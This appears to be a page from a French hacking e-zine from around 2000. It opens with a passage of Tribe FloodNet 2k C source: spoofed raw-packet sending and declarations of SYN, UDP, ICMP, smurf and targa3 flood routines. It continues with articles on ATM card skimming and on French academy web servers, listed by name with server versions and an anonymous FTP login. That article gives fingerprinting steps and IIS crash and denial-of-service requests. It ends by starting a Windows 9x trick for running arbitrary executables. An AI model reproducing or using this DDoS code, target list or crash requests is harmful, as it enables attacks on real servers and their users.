<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; if ((buf[i] == '\n') || (buf[i]
== '\r'))</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; buf[i] = '\0';</font>
<br><font color="#3333FF">}</font>
<p><font color="#3333FF">inline unsigned long</font>
<br><font color="#3333FF">k00lip (void)</font>
<br><font color="#3333FF">{</font>
<br><font color="#3333FF">&nbsp; struct in_addr hax0r;</font>
<br><font color="#3333FF">&nbsp; char convi[16];</font>
<br><font color="#3333FF">&nbsp; int a, b, c, d;</font>
<p><font color="#3333FF">&nbsp; if (nospoof &lt; 1)</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; return (unsigned long) (getrandom
(0, 65535) + (getrandom (0, 65535) &lt;&lt; 8));</font>
<p><font color="#3333FF">&nbsp; hax0r.s_addr = htonl (myip);</font>
<p><font color="#3333FF">&nbsp; sscanf (inet_ntoa (hax0r), "%d.%d.%d.%d",
&amp;a, &amp;b, &amp;c, &amp;d);</font>
<br><font color="#3333FF">&nbsp; if (nospoof &lt; 2)</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; b = getrandom (1, 254);</font>
<br><font color="#3333FF">&nbsp; if (nospoof &lt; 3)</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; c = getrandom (1, 254);</font>
<br><font color="#3333FF">&nbsp; d = getrandom (1, 254);</font>
<p><font color="#3333FF">&nbsp; sprintf (convi, "%d.%d.%d.%d", a, b, c,
d);</font>
<p><font color="#3333FF">&nbsp; return inet_addr (convi);</font>
<br><font color="#3333FF">}</font>
<p><font color="#3333FF">void</font>
<br><font color="#3333FF">tfntransmit (unsigned long from, unsigned long
to, int proto, char id, char *target)</font>
<br><font color="#3333FF">{</font>
<br><font color="#3333FF">&nbsp; char buf[BS], data[BS];</font>
<br><font color="#3333FF">&nbsp; struct ip *ih = (struct ip *) buf;</font>
<br><font color="#3333FF">&nbsp; struct icmp *ich = (struct icmp *) (buf
+ sizeof (struct ip));</font>
<br><font color="#3333FF">&nbsp; struct udp *udh = (struct udp *) (buf
+ sizeof (struct ip));</font>
<br><font color="#3333FF">&nbsp; struct tcp *tch = (struct tcp *) (buf
+ sizeof (struct ip));</font>
<br><font color="#3333FF">&nbsp; struct sa sin;</font>
<br><font color="#3333FF">&nbsp; char *p;</font>
<br><font color="#3333FF">&nbsp; int tot_len = sizeof (struct ip), ssock;</font>
<p><font color="#3333FF">&nbsp; memset (data, 0, BS);</font>
<br><font color="#3333FF">&nbsp; data[0] = PROTO_SEP;</font>
<br><font color="#3333FF">&nbsp; data[1] = id;</font>
<br><font color="#3333FF">&nbsp; data[2] = PROTO_SEP;</font>
<br><font color="#3333FF">&nbsp; strncpy (data + 3, target, BS - 3);</font>
<p><font color="#3333FF">&nbsp; sin.fam = AF_INET;</font>
<br><font color="#3333FF">&nbsp; sin.add = to;</font>
<br><font color="#3333FF">&nbsp; memset (buf, 0, BS);</font>
<p><font color="#3333FF">&nbsp; ih->ver = 4;</font>
<br><font color="#3333FF">&nbsp; ih->ihl = 5;</font>
<br><font color="#3333FF">&nbsp; ih->tos = 0x00;</font>
<br><font color="#3333FF">&nbsp; ih->tl = 0;</font>
<br><font color="#3333FF">&nbsp; ih->id = htons (getrandom (1024, 65535));</font>
<br><font color="#3333FF">&nbsp; ih->off = 0;</font>
<br><font color="#3333FF">&nbsp; ih->ttl = getrandom (200, 255);</font>
<br><font color="#3333FF">&nbsp; ih->sum = 0;</font>
<br><font color="#3333FF">&nbsp; ih->src = from;</font>
<br><font color="#3333FF">&nbsp; ih->dst = to;</font>
<p><font color="#3333FF">&nbsp; switch ((proto == -1) ? getrandom (0, 2)
: proto)</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; {</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; case 0:</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; tot_len += sizeof
(struct icmp);</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ih->pro = ICMP;</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ssock = socket
(AF_INET, SOCK_RAW, ICMP);</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; p = buf + sizeof
(struct ip) + sizeof (struct icmp);</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ich->type = 0;</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ich->code = 0;</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ich->id = getrandom
(0, 1) ? getrandom (0, 65535) : 0;</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ich->seq = getrandom
(0, 1) ? getrandom (0, 65535) : 0;</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ich->sum = 0;</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; encode64 (data,
p, strlen (data));</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; tot_len += strlen
(p);</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ich->sum = cksum
((u16 *) ich, tot_len >> 1);</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ih->tl = tot_len;</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; sin.dp = htons
(0);</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; break;</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; case 1:</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; tot_len += sizeof
(struct udp);</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ih->pro = UDP;</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ssock = socket
(AF_INET, SOCK_RAW, UDP);</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; p = buf + sizeof
(struct ip) + sizeof (struct udp);</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; udh->src = htons
(getrandom (0, 65535));</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; udh->dst = htons
(getrandom (0, 65535));</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; udh->sum = 0;</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; encode64 (data,
p, strlen (data));</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; tot_len += strlen
(p);</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; udh->sum = cksum
((u16 *) udh, tot_len >> 1);</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; udh->len = htons
(sizeof (struct udp) + 3 + strlen (p));</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ih->tl = tot_len;</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; sin.dp = htons
(udh->dst);</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; break;</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; case 2:</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; tot_len += sizeof
(struct tcp);</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ih->pro = TCP;</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ssock = socket
(AF_INET, SOCK_RAW, TCP);</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; p = buf + sizeof
(struct ip) + sizeof (struct tcp);</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; tch->src = htons
(getrandom (0, 65535));</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; tch->dst = htons
(getrandom (0, 65535));</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; tch->seq = getrandom
(0, 1) ? htonl (getrandom (0, 65535) + (getrandom (0, 65535) &lt;&lt; 8))
: 0;</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; tch->ack = getrandom
(0, 1) ? htonl (getrandom (0, 65535) + (getrandom (0, 65535) &lt;&lt; 8))
: 0;</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; tch->off = 0;</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; tch->flg = getrandom
(0, 1) ? (getrandom (0, 1) ? SYN : ACK) : SYN | ACK;</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; tch->win = getrandom
(0, 1) ? htons (getrandom (0, 65535)) : 0;</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; tch->urp = 0;</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; tch->sum = 0;</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; encode64 (data,
p, strlen (data));</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; tot_len += strlen
(p);</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; tch->sum = cksum
((u16 *) tch, tot_len >> 1);</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ih->tl = tot_len;</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; sin.dp = htons
(tch->dst);</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; break;</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; default:</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; exit (0);</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; break;</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; }</font>
<p><font color="#3333FF">&nbsp; setsockopt (ssock, IP, IP_HDRINCL, "1",
sizeof ("1"));</font>
<br><font color="#3333FF">&nbsp; if (sendto (ssock, buf, tot_len, 0, (struct
sockaddr *) &amp;sin, sizeof (sin)) &lt; 0)</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; perror ("sendto");</font>
<p><font color="#3333FF">&nbsp; close (ssock);</font>
<br><font color="#3333FF">}</font>
<p><font color="#3333FF">#ifdef ATTACKLOG</font>
<br><font color="#3333FF">void</font>
<br><font color="#3333FF">dbug (char *s)</font>
<br><font color="#3333FF">{</font>
<br><font color="#3333FF">&nbsp; int f = open (ATTACKLOG, O_WRONLY | O_APPEND
| O_CREAT);</font>
<br><font color="#3333FF">&nbsp; write (f, s, strlen (s));</font>
<br><font color="#3333FF">&nbsp; close (f);</font>
<br><font color="#3333FF">}</font>
<br><font color="#3333FF">#endif</font>
<br>
<hr WIDTH="100%">
<center><font color="#FF0000"><font size=+1>tribe.h</font></font></center>

<p><font color="#FF0000">/*</font>
<br><font color="#FF0000">&nbsp;* Tribe FloodNet - 2k edition</font>
<br><font color="#FF0000">&nbsp;* by Mixter &lt;mixter@newyorkoffice.com></font>
<br><font color="#FF0000">&nbsp;*</font>
<br><font color="#FF0000">&nbsp;* tribe.c - common definitions and includes</font>
<br><font color="#FF0000">&nbsp;*</font>
<br><font color="#FF0000">&nbsp;* This program is distributed for educational
purposes and without any</font>
<br><font color="#FF0000">&nbsp;* explicit or implicit warranty; in no
event shall the author or</font>
<br><font color="#FF0000">&nbsp;* contributors be liable for any direct,
indirect or incidental damages</font>
<br><font color="#FF0000">&nbsp;* arising in any way out of the use of
this software.</font>
<br><font color="#FF0000">&nbsp;*</font>
<br><font color="#FF0000">&nbsp;*/</font>
<p><font color="#FF0000">#ifndef TRIBE_H</font>
<br><font color="#FF0000">#define TRIBE_H</font>
<p><font color="#FF0000">#include &lt;stdio.h></font>
<br><font color="#FF0000">#include &lt;ctype.h></font>
<br><font color="#FF0000">#include &lt;unistd.h></font>
<br><font color="#FF0000">#include &lt;fcntl.h></font>
<br><font color="#FF0000">#include &lt;signal.h></font>
<br><font color="#FF0000">#include &lt;sys/time.h></font>
<br><font color="#FF0000">#include &lt;sys/types.h></font>
<br><font color="#FF0000">#include &lt;sys/socket.h></font>
<br><font color="#FF0000">#include &lt;netdb.h></font>
<br><font color="#FF0000">#include &lt;errno.h></font>
<p><font color="#FF0000">int rand (void);&nbsp; /* standard function prototypes
*/</font>
<br><font color="#FF0000">long int random (void);</font>
<br><font color="#FF0000">void srandom (unsigned int seed);</font>
<br><font color="#FF0000">void srand (unsigned int seed);</font>
<br><font color="#FF0000">int atoi (const char *nptr);</font>
<br><font color="#FF0000">int system (const char *string);</font>
<br><font color="#FF0000">char *getpass (const char *prompt);</font>
<br><font color="#FF0000">char *strtok (char *s, const char *delim);</font>
<br><font color="#FF0000">void *calloc (size_t nmemb, size_t size);</font>
<br><font color="#FF0000">void *malloc (size_t size);</font>
<br><font color="#FF0000">void free (void *ptr);</font>
<br><font color="#FF0000">void bzero (void *s, int n);</font>
<br><font color="#FF0000">void *memset (void *s, int c, size_t n);</font>
<br><font color="#FF0000">char *strncpy (char *dest, const char *src, size_t
n);</font>
<br><font color="#FF0000">int strcasecmp (const char *s1, const char *s2);</font>
<p><font color="#FF0000">#include "ip.h"</font>
<br><font color="#FF0000">#include "aes.h"</font>
<br><font color="#FF0000">#include "config.h"</font>
<p><font color="#FF0000">//char shameless_self_promotion[] = "\t\t[0;35m[tribe
flood network]\t (c) 1999 by [5mMixter[0m\n\n";</font>
<p><font color="#FF0000">#define BS 4096</font>
<p><font color="#FF0000">void random_init (void);</font>
<br><font color="#FF0000">inline long getrandom (int, int);</font>
<br><font color="#FF0000">void trimbuf (char *);</font>
<br><font color="#FF0000">#ifdef ATTACKLOG</font>
<br><font color="#FF0000">void dbug (char *);</font>
<br><font color="#FF0000">#endif</font>
<p><font color="#FF0000">void tfntransmit (unsigned long, unsigned long,
int, char, char *);</font>
<p><font color="#FF0000">void syn (unsigned long, unsigned short);</font>
<br><font color="#FF0000">void udp (unsigned long);</font>
<br><font color="#FF0000">void targa3 (unsigned long);</font>
<br><font color="#FF0000">void icmp (unsigned long, unsigned long);</font>
<p><font color="#FF0000">inline unsigned long k00lip (void);</font>
<br><font color="#FF0000">void must_kill_all (void);</font>
<br><font color="#FF0000">void commence_udp (char *);</font>
<br><font color="#FF0000">void commence_syn (char *, int);</font>
<br><font color="#FF0000">void commence_icmp (char *);</font>
<br><font color="#FF0000">void commence_mix (char *);</font>
<br><font color="#FF0000">void commence_smurf (char *);</font>
<br><font color="#FF0000">void commence_targa3 (char *);</font>
<br><font color="#FF0000">void shellsex (int);</font>
<p><font color="#FF0000">struct tribe</font>
<br><font color="#FF0000">&nbsp; {</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp; char start;</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp; char id;</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp; char end;</font>
<br><font color="#FF0000">&nbsp; };</font>
<p><font color="#FF0000">#endif</font>
<br>&nbsp;
<br>&nbsp;
<br>
<br>
<center>
<p><u><font size=+2>Cartes bancaires falsifiables</font></u>
<br><b><font face="Verdana"><font color="#009900"><font size=-1>(greetz
to Radin)</font></font></font></b></center>

<p>Au fur et &agrave; mesure que les techniques &eacute;voluent, les gens
eux-m&ecirc;me, et leur comportement, &eacute;volue. Pour se satisfaire
en besoin mat&eacute;riel il faut de l'argent (en g&eacute;n&eacute;ral).
Et pour avoir de l'argent une ing&eacute;niosit&eacute; in&eacute;gal&eacute;e
pourra &ecirc;tre mise en oeuvre. Par d&eacute;fi ou curiosit&eacute;,
Serge Humpich a d&eacute;montr&eacute; la faiblesse des cartes bancaires.
D'autres m&eacute;thodes ont &eacute;t&eacute; utilis&eacute;es pour se
faire de l'argent, comme:
<p><i><font color="#008080">Les services de police ont saisi la semaine
derni&egrave;re en Belgique plus de 5000 fausses cartes bleues (Visa, Mastercard,
etc...).</font></i>
<p><i><font color="#008080">Ces fausses cartes d&eacute;bitent des comptes
existants, voila comment :</font></i>
<p><i><font color="#008080">Un faux clavier est superpos&eacute; au vrai
clavier d'un distributeur de billets. Une personne qui vient retirer de
l'argent entre sa carte, tape son code, recup&egrave;re ses billets, recup&egrave;re
sa carte, et s'en va. Pendant ce temps, le faux clavier a enregistr&eacute;&nbsp;
le code de la CB, et la piste magn&eacute;tique de la carte est copi&eacute;e...
reste &agrave; inscrire les informations de la piste sur une carte bidon,
et le tour est jou&eacute;..</font></i>
<p><i><font color="#008080">A ce jour, plusieurs milliers de personnes
se sont fait subtiliser leur argent.. beaucoup ne s'en sont pas apercu.</font></i>
<p><i><font color="#008080">Le GIE Cartes bancaires a demand&eacute; aux
banques de taire cette information, de peur de faire face &agrave; une
psychose de la carte bancaire.</font></i>
<p><i><font color="#008080">Un conseil, regardez bien vos relev&eacute;s
de comptes. Sachez aussi que les banques et les assurances ne remboursent
pas ce genre de probl&egrave;mes.</font></i>
<br><b><i><font color="#008080">(source: fr.misc.droits)</font></i></b>
<br>&nbsp;
<br>&nbsp;
<br>
<br>
<br>
<br>
<center>
<p><u><font size=+2>Acad&eacute;mies + serveurs microsoft IIS</font></u>
<br><b><font face="Verdana"><font color="#009900"><font size=-1>(greetz
to ??z)</font></font></font></b></center>

<p><b>Introduction:</b> merci a KoSaK sans qui l'article n'aurait jamais
ete ecrit. Rappelons que KoSaK a pirate plusieurs serveurs academiques,
ce qui m'a pousse a m'interesser au sujet. Il etait clair qu'avec des serveurs
pirates a son actif, KoSaK avait trouve quelquechose qui clochait sur ces
deux serveurs. C'est cette chose que je me suis permi de retrouver et d'approfondir.
<p><b>Sommaire:</b>
<p>- Etude des serveurs pirat&eacute;s
<br>- Etudes de cas (madchat...)
<br>- Quelques failles sous IIS (sources diverses)
<p>Kosak avait pirate les serveurs academiques de Creteil et d'orleans.
Quel est le point commun entre ces 2 serveurs: quelquechose de precis faisaient
qu'ils etaient vulnerables.
<br>Apres etude du systeme des serveurs j'ai trouve que chacun de ces 2
serveurs academiques tournait sous IIS 4.0, ce qui pourrait expliquer qu'une
faille ait ete exploite.
<p>Cet article est la copie conforme de l'article que j'ai &eacute;crit
dans 3d13 #5 sauf qu'&agrave; la base mon article comportait des accents.
Il ne faut pas perdre de vue que ces failles, Microsoft les connait pour
la grande majorit&eacute; et des correctifs sont distribu&eacute;s sur
le site officiel de Microsoft: <a href="http://www.microsoft.com">www.microsoft.com</a>.
<p>Voici une liste des serveurs academiques francais avec la version du
serveur, pour chacun d'entre eux (liste du 03/02/2000):
<p>Academie d'Aix-Marseille:
<br>http://www.ac-aix-marseille.fr
<br>Microsoft IIS 4.0
<p>Academie d'Amiens:
<br>http://www.ac-amiens.fr
<br>Microsoft IIS 4.0
<p>Academie de Besancon:
<br>http://www.ac-besancon.fr
<br>Netscape-Enterprise 3.6 SP2
<p>Academie de Bordeaux:
<br>http://www.ac-bordeaux.fr
<br>Netscape-Enterprise 3.5.1B
<p>Academie de Caen:
<br>http://www.ac-caen.fr
<br>Netscape-Enterprise 3.5.1
<p>Academie de Clermont-Ferrand:
<br>http://www.ac-clermont.fr
<br>Netscape-Enterprise 3.5.1
<p>Academie de la Corse:
<br>http://www.ac-corse.fr
<br>Microsoft IIS 4.0
<p>Academie de Creteil:
<br>http://www.ac-creteil.fr
<br>Microsft IIS 4.0
<p>Academie de Dijon:
<br>http://www.ac-dijon.fr
<br>Netscape-Enterprise 3.6
<p>Academie de Grenoble:
<br>http://www.ac-grenoble.fr
<br>Apache 1.3.6 (Unix) PHP 3.0.12
<p>Academie de Lille:
<br>http://www.ac-lille.fr
<br>Microsoft IIS 4.0
<p>Academie de Limoges:
<br>http://www.ac-limoges.fr
<br>Microsoft IIS 4.0
<p>Academie de Lyon:
<br>http://www.ac-lyon.fr
<br>Netscape-Enterprise 3.6
<br>[Nd 3d13 : acces anonyme = ftp/ftpmaint]
<p>Academie de Montpellier:
<br>http://www.ac-montpellier.fr
<br>Netscape-Enterprise 3.6
<p>Academie de Nancy-Metz:
<br>http://www.ac-nancy-metz.fr
<br>Microsft IIS 3.0
<p>Academie de Nantes:
<br>http://www.ac-nantes.fr
<br>Netscape-Enterprise 3.5.1
<p>Academie de Nice:
<br>http://www.ac-nice.fr
<br>Microsoft-IIS 3.0
<p>Academie d'Orleans-Tours:
<br>http://www.ac-orleans-tours.fr
<br>Microsoft-IIS 4.0
<p>Academie de Paris:
<br>http://www.ac-paris.fr
<br>Netscape-Enterprise 3.6 SP2
<p>Academie de Poitiers:
<br>http://www.ac-poitiers.fr
<br>Microsoft-IIS 4.0
<p>Academie de Reims:
<br>http://www.ac-reims.fr
<br>Microsoft-IIS 3.0
<p>Academie de Rennes:
<br>http://www.ac-rennes.fr
<br>Microsoft-IIS 3.0
<p>Academie de Rouen:
<br>http://www.ac-rouen.fr
<br>Apache1.3.6 (Unix)&nbsp; (Red Hat/Linux) PHP 3.0.7
<p>Academie de Strasbourg:
<br>http://www.ac-strasbourg.fr
<br>Netscape-Enterprise 3.5.1
<p>Academie de Toulouse:
<br>http://www.ac-toulouse.fr
<br>Apache 1.3.2 (Unix)
<p>Academie de Versailles:
<br>http://www.ac-versailles.fr
<br>Microsoft-IIS 4.0
<p>Entre autres, le serveur de canalweb qui a ete pirater par KoSaK: http://www.canalweb.net
de serveur IIS 4.0.
<br>Et celui de CD Universe, par Maxus: http://www.cduniverse.com de serveur
IIS 4.0
<p><u>Note:</u> il existe des serveurs Apache disponibles pour differentes
plates-formes. Il est utile d'en connaitre la plate-forme. Il existe aussi
des serveurs Apache pour les systemes Win 9x.
<p>Toutes ces attaques reussies a l'encontre de divers serveurs sous IIS
laissent a penser que KoSaK exploite les failles de ces serveurs. Voici
une liste probablement non exhaustive des failles sur les serveurs IIS
de differentes versions.
<p><font color="#008080"><b><u>Petite astuce:</u></b><i> </i>il est possible
de connaitre la version d'un serveur en le forcant a s'identifier! Cela
marche pour les serveurs FTP ou HTTP. Il faut bien se dire que ce ne sont
pas parfois les memes.</font>
<br><font color="#008080"><i>Exemple Multimania:</i> le serveur HTTP multimania.com
est un serveur Apache 1.3.6 (Unix), et le serveurFTP (hop.multimania.com)
est un serveur Apache 1.3.3 (Unix). La difference est minime et tient &agrave;
la version, mais dans des reseaux plus vastes il se peut que les serveurs
changent radicalement. Et pour forcer le serveur a se presenter (s'il ne
se presente pas des le debut, comme c'est le cas, en general, en connection
FTP) on lui fait rentrer des commandes erronees qui vous deconnecteront
et le feront se presenter.</font>
<br><i><font color="#008080">Exemple madchat.org:</font></i>
<br><font color="#008080">On sait d'avance que le serveur HTTP et FTP reste
le meme. Donc on se connecte sur (utilisez de preference telnet):</font>
<br><i><font color="#008080">www.madchat.org</font></i>
<br><i><font color="#008080">port 80</font></i>
<br><font color="#008080">Tapez GET ../.. en premier lieu avant toutes
autres commandes. Si le serveur est de type IIS 4.0 vous allez vous faire
deconnecter avec un message du genre:</font>
<br><font color="#FF0000">HTTP/1.1 400 Demande incorrecte</font>
<br><font color="#FF0000">Serveur: Microsoft-IIS/4.0</font>
<br><font color="#FF0000">Date: ...</font>
<br><font color="#FF0000">etc</font>
<br><font color="#008080">Dans le cas echeant connectez vous a madchat.org
en FTP:</font>
<br><i><font color="#008080">www.madchat.org</font></i>
<br><i><font color="#008080">FTP (port 21)</font></i>
<br><font color="#008080">Puis tapez "help":</font>
<br><font color="#008080">Soit le serveur se presente directement (qqch
FTP microsoft Version 4.0) et donc vous savez que c du IIS 4.0 soit vous
devez faire des commandes de types syst ou version... bref les possibilites
sont multiples.</font>
<br><font color="#008080">(A noter que si vous tapez help et que vous voyez
toute la liste de commande s'afficher en collonne, vous pouvez vous douter
que c du IIS, car seul IIS fait aussi mal presente).</font>
<p>Voici une liste non exhaustive de diverses failles existantes sur les
versions des serveurs IIS 5.0, 4.0:
<br>(sources: security focus, rootshell, insecure, Securite Optimale)
<p><b><u>IIS 5.0 (ce serveur n'est pas assez developpe, pourtant il est
certain que des failles vont etre decouvertes):</u></b>
<br>&nbsp;
<ul>
<li>
Vulnerabilite NT IIS ASP: on peut voir le source d'un VBScript lorsqu'une
erreur IIS ASP se produit: recherchez le repertoire d'apres le message
d'erreur. Exemple, le message d'erreur vous dit: "Microsoft VBScript runtime
error '800a0005' Invalid procedure call or argument: 'mid' /common/browser.inc,
line 4..." et vous allez sur http://www.url.com/common/browser.inc.</li>

<li>
Les requetes de types GET posaient beaucoup de problemes a nos amis de
chez microsoft pour IIS 4.0. Maintenant IIS 5.0 est affectee d'un autre
maniere: une requete de type GET d'un fichier non existant mais dont l'extension
est enregistree IISAPI (ie, .pl, .idq) va creer une erreur faisant que
le serveur va vous retourner un message vous indiquant le repertoire de
l'acces root du serveur. Exemple: CGI Error The specified CGI application
misbehaved by not returning a complete set of HTTP headers. The headers
it did return are: Can't open perl script "C:\InetPub\scripts\ bogus.pl":
No such file or directory</li>
</ul>

<p><br><b><u>IIS 4.0 (assurement le plus utilse de la gamme microsoft):</u></b>
<br>&nbsp;
<ul>
<li>
Un utilisateur distant peut acceder a des fichiers proteges si Windows
tronque le nom du fichier lors d'un depassement de imite de caracteres.
Exemple: comme vous avez "File~1.com" au lieu de "FileServeur.com". Un
appel distant de la version tronquee peut ainsi etre realisee.</li>

<li>
C'est moins courant, bien sur, mais un serveur IIS 4.0 peut crasher si
on lui fait une requet "GET ../.." sur le port 80 (HTTP).</li>

<li>
Si un serveur ftp contient plus de 100 repertoires ou sites virtuels, il
est facile de faire bugger celui-ci. En effet si une dizaine ou meme plus
de tentatives d'upload ou de suppresion de fichiers sont faites en meme
temps, le serveur repondra: "426 Connection closed; transfer aborted",
apres quoi, si un veritable utilisateur cherche a mettre a jour un fichier,
le serveur va reecrire sur l'ancien fichier avec 0 ko de donnees, ce qui
fait que lors de l'ouverture du fichier un message du style: "File contains
no data" apparaitra. Seul un redemarrage complet du serveur (donc mise
hors service du serveur) permettra de resoudre le probleme.</li>

<li>
Les serveurs FTP IIS 4.0 qui ont installe un post specifique SP5 FTP sont
vulnerables a un exploit ou des personnes non-autorisees peuvent telecharger
ou supprimer des fichiers. pour savoir si le serveur est vulnerable il
faut regarder la version du fichier Ftpsvc.dll: des versions 0718 a 0722
sont vulnerables.</li>

<li>
Une attaque de type Denial of Service (DoS) peut-etre lance sur un serveur
IIS grace a des requetes malformes du service HTTP, exemple lorsqu'on envoie
beaucoup de "Hos: aaaaa...", la memoire va flancher et pour faire marcher
le service correctement, il faudra faire redemarrer l'ordinateur:</li>
</ul>
<font color="#FF0000">GET / HTTP/1.1</font>
<br><font color="#FF0000">Host: aaaaaaaaaaaaaaaaaaaaaaa....(200 bytes)</font>
<br><font color="#FF0000">Host: aaaaaaaaaaaaaaaaaaaaaaa....(200 bytes)</font>
<br><font color="#FF0000">...10,000 lines</font>
<br><font color="#FF0000">Host: aaaaaaaaaaaaaaaaaaaaaaa....(200 bytes)</font>
<ul>
<li>
Pour crasher le service inetinfo.exe, sous IIS4.0, il faut se connecter
sur le serveur FTP (sous DOS): enregistrez vous en anonyme sur le serveur
ftp et tapez: ls aaaaaaa...(316 caracteres)...aaa , le service inetinfo.exe
va crasher et la connection redemarrera.</li>
</ul>
&nbsp;&nbsp; Il existe d'autres failles mais dans des cas plus specifiques
et relativement a un acces local au serveur, ce que nous n'avons pas toujours.
Si je devais donner un conseil pour vous aider a r&eacute;soudre vos probl&egrave;mes
IIS, c'est d'installer un serveur Apache (il en existe pour Win32).
<br>&nbsp;
<br>&nbsp;
<br>
<br>
<center>
<p><u><font size=+2>Astuces de reals hackers</font></u>
<br><font face="Verdana"><font color="#009900"><font size=-1><b>(greetz
to Acides Burnes</b>)</font></font></font></center>

<p><font color="#000000"><font face="Verdana">&nbsp;&nbsp; </font>Vous
voici dans la partie la plus int&eacute;ressante du zine. Apr&egrave;s
quelques temps pass&eacute;s derri&egrave;re l'&eacute;cran, je suis en
mesure de vous apprendre &agrave; &eacute;x&eacute;cuter un .exe <b>sous
window</b>s au nez et &agrave; la barbe de <b>toutes</b> les protections,
quelles qu'elles soient! Cette faille marche avec les sysyt&egrave;mes
Windows 9x, et vous demande d'avoir acc&egrave;s direct &agrave; la machine
attaqu&eacute;e. Je peux aussi vous apprendre comment se faire rembourser
du matos qui n'est plus assur&eacute; et avoir des logiciels gratuits,
et aussi comment changer les couleurs de l'&eacute;cran d'erreur fatal
de Windows. On pourrait alors se tourner vers une astuce pour rendre les
r&eacute;pertoires en partage invisibles et comment faire planter son PC
Zindoz de mani&egrave;re irr&eacute;m&eacute;diable. Et pour finir: quelques
astuces sur le gravage des CD.</font>
<center>
<p><b><u><font color="#000000">EXPLORER.EXE</font></u></b></center>

<p><font color="#000000">&nbsp;&nbsp; La faille est simple: elle consiste
&agrave; faire &eacute;x&eacute;cuter &agrave; windows, un programme de
votre choix. Quel est, selon vous, le premier programme qui se lance, avant
l'ouverture de session? Il s'agit de <b>explorer.exe (C:\windows\explorer.exe)</b>.
